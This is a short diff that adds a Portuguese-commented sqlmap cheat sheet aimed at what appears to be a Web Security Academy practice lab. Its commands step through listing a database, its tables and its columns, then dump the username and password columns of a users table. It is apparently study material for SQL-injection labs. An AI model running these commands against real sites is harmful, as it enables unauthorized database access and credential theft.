@@ -1,0 +1,14 @@
+# SQLMap Commands - Substituir variáveis como exemplo "db_name" por nomedobanco sem aspas.
+
+
+#  Comando para listar banco de dados
+ sqlmap -u https://0a75001903d6b435c0dd8cb50046000a.web-security-academy.net/filter?category=Tech+gifts~ --dbs   
+
+#  Comando para listar tabelas do banco de dados apontado em "db_name"
+ sqlmap -u https://0a75001903d6b435c0dd8cb50046000a.web-security-academy.net/filter?category=Tech+gifts~ -D "db_name" --tables
+
+#  Comando para listar colunas especificado com tabela (-T) e banco de dados (-D)
+ sqlmap -u https://0a75001903d6b435c0dd8cb50046000a.web-security-academy.net/filter?category=Tech+gifts~ -D "db_name" -T "table_name" --columns
+
+#  Comando para extrair dump (visualizar conteúdo das colunas);
+ sqlmap -u https://0a75001903d6b435c0dd8cb50046000a.web-security-academy.net/filter?category=Tech+gifts~ -D "db_name" -T users --columns "password, username" --dump
